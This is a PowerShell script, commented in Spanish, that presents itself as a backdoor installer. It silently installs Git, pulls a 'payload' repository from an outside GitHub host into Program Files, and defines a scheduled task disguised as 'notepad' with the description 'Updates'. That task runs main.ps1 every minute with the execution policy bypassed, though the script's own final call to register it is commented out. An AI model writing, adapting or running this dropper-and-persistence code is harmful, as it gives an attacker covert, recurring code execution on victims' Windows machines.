# Configuración
$program_name = "backdoor_program" # Se creara una carpeta con este nombre
$program_to_execute = "main.ps1" # Programa a ejecutar
$git_origin = "https://github.com/elcaza/git_backdoor.git"
# End Configuración


$is_git_ready=$false
$program_location = $env:ProgramFiles+"\"+$program_name
$git_client = "https://github.com/git-for-windows/git/releases/download/v2.24.0.windows.1/Git-2.24.0-64-bit.exe"


# Corroboramos si git está instalado
function check_git {
	try {
		git | Out-Null
		"Git is installed"
		return $true
	} catch [System.Management.Automation.CommandNotFoundException] {
		return $false
	}
}

# Descargamos git
function download_git {
	$job = Start-Job { 
		# Con el $using bindeamos el contexto de la función para enviar la variable program_location
		Set-Location $using:program_location
		function download_git {
			"Descargando git..."
			Invoke-WebRequest -Uri $using:git_client -OutFile ".\git.exe"
		} download_git
	}
	# Creamos una tarea asincrona
	Wait-Job $job
	Receive-Job $job
	"Git instalado"
}

# Instalamos git
function install_git {
	"Instalando git"
	Set-Location $program_location
	try {
		Start-Process "git.exe" -argumentlist "/VERYSILENT /passive /norestart" -wait
	} catch {
		"error"
	}
}

function download_backdoor {
	$job = Start-Job { 
		# Con el $using bindeamos el contexto de la función para enviar la variable program_location
		Set-Location $using:program_location
		function download_repo {
			"Inicializando repositorio..."
            git init
			git config user.name "John Doe"
			git config user.email "johndoe@example.com"
			git remote add origin $using:git_origin

			
            # Descargando payload
			"Clonado repositorio..."
            git pull origin master
		} download_repo	
	}
	# Creamos una tarea asincrona
	Wait-Job $job
	Receive-Job $job
	"Backdoor descargado"
}



# function load_backdoor {
# 	# Creamos una tarea programada
# 	$job = Start-Job { 
# 		function load_program {
# 			#$action = New-ScheduledTaskAction -Execute "Powershell.exe" -Argument $using:program_location + ".\" + $using:program_to_execute
# 			$action = New-ScheduledTaskAction -Execute "Powershell.exe" -Argument -file $using:program_location + $using:program_to_execute
# 			#$action = New-ScheduledTaskAction -Execute "Powershell.exe" -Argument -file "C:\script.ps1"

# 			# $trigger =  New-ScheduledTaskTrigger -Daily -At 10am
# 			$trigger = New-ScheduledTaskTrigger -Once -At 7am -RepetitionDuration  (New-TimeSpan -Days 1)  -RepetitionInterval  (New-TimeSpan -Minutes 1)

# 			Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "W2 Updates" -Description "Updates"
# 		} load_program 
# 	}
# 	Wait-Job $job
# }

function load_backdoor {
	# $action = New-ScheduledTaskAction -Execute powershell.exe -Argument "Set-Location 'C:\Program Files\z'; powershell –ExecutionPolicy Bypass .\main.ps1 ;"

	# $program_location = $env:ProgramFiles+"\"+$program_name
	$argument_to_execute = "Set-Location " + $program_location +"; powershell –ExecutionPolicy Bypass .\main.ps1 ;"


	$action = New-ScheduledTaskAction -Execute powershell.exe -Argument $argument_to_execute
	
	$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionDuration  (New-TimeSpan -Days 1)  -RepetitionInterval  (New-TimeSpan -Minutes 1)
	
	Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "notepad" -Description "Updates"
}

function start_program{
	# Si git no está instalado
	if( !(check_git) ) {
		"Creando ubicaciones"
		# Creando ubicaciones
		Set-Location $env:ProgramFiles 
		mkdir $program_name
		Set-Location $program_name 

		"Descargando git"
		# Descargamos git
		download_git
		"Git descargado"

		"Instalando git"
		# Instalamos git
		install_git
		"Git instalado"

		$contador = 0
		while( !($is_git_ready) ){
			"Probando git"

			"Actualiznado variables"
			# Actualizamos nuestra variables de entorno
			$env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User") 

			if(check_git) {
				$is_git_ready=$true
			}
			
			if ( $contador -ge 10 ){
				$is_git_ready=$true
			}
			$contador++
			"Git no encontrado"
			Start-Sleep -s 5
		}
	}
	
	#Download repo
	download_backdoor
	
	"Ahora deberia cargar la tarea programada"
	# Creando tarea programada
	# load_backdoor
}

start_program